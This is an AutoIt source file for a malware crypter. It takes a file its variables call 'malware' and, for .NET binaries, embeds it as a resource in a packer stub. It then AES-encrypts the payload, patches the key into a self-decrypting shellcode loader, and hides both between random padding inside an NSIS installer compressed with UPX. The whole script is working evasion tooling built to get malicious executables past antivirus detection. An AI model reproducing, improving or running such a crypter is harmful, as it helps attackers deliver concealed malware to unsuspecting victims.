#include "WinAPI.au3"
#include "WinAPIRes.au3"
#include "APIResConstants.au3"
#include "Crypt.au3"
#include "String.au3"
#include "File.au3"

If $CmdLine[0] < 4 Then Exit

$malware = $CmdLine[1]
$shell = $CmdLine[2]
$outfile = $CmdLine[3]
$nsi = $CmdLine[4]

FileCopy(@ScriptDir & "\net_packer.exe", @ScriptDir & "\net.exe", $FC_OVERWRITE)

$pid = Run("dumpbin /clrheader " & '"' & $malware & '"', @ScriptDir, @SW_HIDE, 0x2) ; add the folder that contains dumpbin.exe in the PATH variable (its part of VS)
ProcessWaitClose($pid)
$stdout = StdoutRead($pid)
If (StringInStr($stdout, "clr Header")) Then
	$hUp = _WinAPI_BeginUpdateResource(@ScriptDir & "\net.exe")
	$res = DllStructCreate("byte["&FileGetSize($malware)&"]")
	DllStructSetData($res, 1, FileRead($malware))
	_WinAPI_UpdateResource($hUp, $RT_RCDATA, 0, 0, DllStructGetPtr($res), DllStructGetSize($res))
	_WinAPI_EndUpdateResource($hUp)
	FileMove(@ScriptDir & "\net.exe", $malware, $FC_OVERWRITE)
	$res = 0
EndIf

$mlwr_bytes = Binary(FileRead($malware))
$shell_bytes = Binary(FileRead($shell))

$struct_key = DllStructCreate("byte [16]")
$struct_key2 = DllStructCreate("dword key1; dword key2; dword key3; dword key4;", DllStructGetPtr($struct_key))

_Crypt_GenRandom(DllStructGetPtr($struct_key), DllStructGetSize($struct_key))

ConsoleWrite(DllStructGetData($struct_key, 1) & @CRLF)
$mlwr_enc = _Crypt_EncryptData($mlwr_bytes, DllStructGetData($struct_key, 1), $CALG_AES_256)

$shell_bytes = StringReplace($shell_bytes, "EFBEADDE", StringTrimRight(SwapEndian(DllStructGetData($struct_key2, 1)), 8), 1)
$shell_bytes = StringReplace($shell_bytes, "EFBEADDE", StringTrimRight(SwapEndian(DllStructGetData($struct_key2, 2)), 8), 1)
$shell_bytes = StringReplace($shell_bytes, "EFBEADDE", StringTrimRight(SwapEndian(DllStructGetData($struct_key2, 3)), 8), 1)
$shell_bytes = StringReplace($shell_bytes, "EFBEADDE", StringTrimRight(SwapEndian(DllStructGetData($struct_key2, 4)), 8), 1)

$rnd_shell = Random(0, 1000000000, 1)
$rnd_shell_out = Random(0, 1000000000, 1)
FileWrite(@ScriptDir & "\" & $rnd_shell, Binary($shell_bytes))

ShellExecuteWait(@ScriptDir & "\self_decryptor_builder.exe", $rnd_shell & " " & $rnd_shell_out & " " & Random(3, 6, 1), @ScriptDir)

$shell_enc = Binary(FileRead(@ScriptDir & "\" & $rnd_shell_out))

$rand_start = Random(200, 5000, 1)
$rand_mid = Random(200, 5000, 1)
$rand_end = Random(200, 5000, 1)

$struct = DllStructCreate("byte [" & $rand_start & "]; byte [" & BinaryLen($mlwr_enc) & "]; byte [" & $rand_mid & "]; byte [" & FileGetSize(@ScriptDir & "\" & $rnd_shell_out) & "]; byte [" & $rand_end & "];")

ConsoleWrite(@error & @CRLF & BinaryLen($mlwr_enc) & @CRLF & BinaryLen($shell_enc) & @CRLF)

_Crypt_GenRandom(DllStructGetPtr($struct, 1), $rand_start)
_Crypt_GenRandom(DllStructGetPtr($struct, 3), $rand_mid)
_Crypt_GenRandom(DllStructGetPtr($struct, 5), $rand_end)

DllStructSetData($struct, 2, $mlwr_enc)
DllStructSetData($struct, 4, $shell_enc)

$tmp_payload = Random(0, 1000000000, 1)

FileWrite(@ScriptDir & "\" & $tmp_payload, DllStructGetData($struct, 1))
FileWrite(@ScriptDir & "\" & $tmp_payload, DllStructGetData($struct, 2))
FileWrite(@ScriptDir & "\" & $tmp_payload, DllStructGetData($struct, 3))
FileWrite(@ScriptDir & "\" & $tmp_payload, DllStructGetData($struct, 4))
FileWrite(@ScriptDir & "\" & $tmp_payload, DllStructGetData($struct, 5))

$script = FileRead($nsi)
$script = StringReplace($script, ";#Files#", "File " & '"' & @ScriptDir & "\" & $tmp_payload & '"')
$script = StringReplace($script, "%file%", $tmp_payload)
$script = StringReplace($script, "%size%", DllStructGetSize($struct))
$script = StringReplace($script, "%mlwr_size%", BinaryLen($mlwr_enc))
$script = StringReplace($script, "%offset_shell%", $rand_start + BinaryLen($mlwr_enc) + $rand_mid)
$script = StringReplace($script, "%offset_mlwr%", $rand_start)

$tmp_script = Random(0, 1000000000, 1)

FileWrite(@ScriptDir & "\" & $tmp_script, $script)

ShellExecuteWait("C:\Program Files (x86)\NSIS\makensis.exe", "/DUSE_UPX /V1 " & '"' & @ScriptDir & "\" & $tmp_script & '"')

FileMove(@ScriptDir & "\" & $tmp_script & ".exe", $outfile, $FC_OVERWRITE)

FileDelete(@ScriptDir & "\" & $tmp_script)
FileDelete(@ScriptDir & "\" & $tmp_payload)
FileDelete(@ScriptDir & "\" & $rnd_shell)
FileDelete(@ScriptDir & "\" & $rnd_shell_out)

Func SwapEndian($Data)
	Return Hex(Binary($Data))
EndFunc   ;==>SwapEndian

Func Align($num)
	While Mod($num, 4) <> 0
		$num += 1
	WEnd
	Return $num
EndFunc   ;==>Align

